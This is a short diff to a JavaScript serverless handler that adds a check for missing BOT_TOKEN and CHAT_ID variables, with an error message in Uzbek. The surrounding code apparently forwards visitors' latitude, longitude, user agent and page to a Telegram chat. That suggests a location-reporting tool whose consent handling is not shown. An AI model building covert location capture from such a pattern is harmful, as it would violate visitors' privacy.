@@ -5,6 +5,12 @@ export default async function handler(req, res) {
   }
 
   try {
+    if (!process.env.BOT_TOKEN || !process.env.CHAT_ID) {
+      console.error("Missing BOT_TOKEN or CHAT_ID in environment variables.");
+      res.status(500).json({ ok: false, error: "BOT_TOKEN yoki CHAT_ID sozlanmagan." });
+      return;
+    }
+
     const { latitude, longitude, accuracy, page, userAgent, time } = req.body;
 
     const text = `
